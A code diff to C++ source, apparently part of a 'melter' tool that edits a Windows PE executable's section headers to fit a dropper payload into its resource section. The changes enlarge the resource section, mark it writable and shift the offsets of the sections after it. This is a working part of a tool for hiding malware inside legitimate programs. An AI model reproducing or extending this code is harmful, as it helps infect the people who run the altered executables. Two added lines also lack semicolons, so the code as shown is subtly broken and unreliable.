@@ -272,6 +272,8 @@ StateResult ParseHeaders::process()
 	PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER) ( (char*)ntHeaders_ + sizeof(IMAGE_NT_HEADERS) );
 	ImageSectionHeader& rsrcHeader = context<StreamingMelter>().resourceSection();
 
+	int rsrcFlag = 0;
+	unsigned long prevPointerToRaw, prevSizeOfRaw, prevVirtualAddr, prevVirtualSize
 	std::size_t numberOfSections = context<StreamingMelter>().numberOfSections();
 	for (std::size_t sectionIdx = 0; sectionIdx < numberOfSections; ++sectionIdx)
 	{
@@ -279,15 +281,41 @@ StateResult ParseHeaders::process()
 			throw parsing_error("Invalid section header.");
 
 		if (sectionHeader->VirtualAddress == rsrcHeader->VirtualAddress) {
+			if (sectionHeader->Misc.VirtualSize < sectionHeader->SizeOfRawData)
+			{
+				sectionHeader->Misc.VirtualSize = sectionHeader->Misc.VirtualSize + dropper.size();
+				sectionHeader->SizeOfRawData = alignTo(sectionHeader->Misc.VirtualSize, context<StreamingMelter>().fileAlignment());
+			}
+			else
+			{
+				sectionHeader->Misc.VirtualSize = sectionHeader->Misc.VirtualSize + dropper.size();	
+				sectionHeader->SizeOfRawData = alignTo(sectionHeader->SizeOfRawData + dropper.size(), context<StreamingMelter>().fileAlignment());
+			}
 
-			sectionHeader->SizeOfRawData = alignTo(sectionHeader->SizeOfRawData + dropper.size(), context<StreamingMelter>().fileAlignment());
-			sectionHeader->Misc.VirtualSize = alignTo(sectionHeader->Misc.VirtualSize + dropper.size(), context<StreamingMelter>().sectionAlignment());
+			//sectionHeader->SizeOfRawData = alignTo(sectionHeader->SizeOfRawData + dropper.size(), context<StreamingMelter>().fileAlignment());
+			//sectionHeader->Misc.VirtualSize = alignTo(sectionHeader->Misc.VirtualSize + dropper.size(), context<StreamingMelter>().sectionAlignment());
 			sectionHeader->Characteristics |= IMAGE_SCN_MEM_WRITE;
 
 			DEBUG_MSG(D_VERBOSE, "Resource section: %s", (PCHAR) rsrcHeader->Name);
 			DEBUG_MSG(D_VERBOSE, "\tDropper size: %08x", dropper.size());
 			DEBUG_MSG(D_VERBOSE, "\tSizeOfRawData changed to %08x", (std::size_t) sectionHeader->SizeOfRawData);
 			DEBUG_MSG(D_VERBOSE, "\tVirtualSize change to %08x", (std::size_t) sectionHeader->Misc.VirtualSize);
+
+			rsrcFlag = 1;
+                        prevPointerToRaw = sectionHeader->PointerToRawData;
+                        prevSizeOfRaw = sectionHeader->SizeOfRawData;
+                        prevVirtualAddr = sectionHeader->VirtualAddress;
+                        prevVirtualSize = sectionHeader->Misc.VirtualSize
+		}
+		else if (rsrcFlag == 1)
+		{
+                        sectionHeader->PointerToRawData = prevPointerToRaw + prevSizeOfRaw;
+                        sectionHeader->VirtualAddress = alignTo(prevVirtualAddr + prevVirtualSize, context<StreamingMelter>().sectionAlignment());
+
+			prevPointerToRaw = sectionHeader->PointerToRawData;
+			prevSizeOfRaw = sectionHeader->SizeOfRawData;
+			prevVirtualAddr = sectionHeader->VirtualAddress;
+			prevVirtualSize = sectionHeader->Misc.VirtualSize;
 		}
 
 		++sectionHeader;
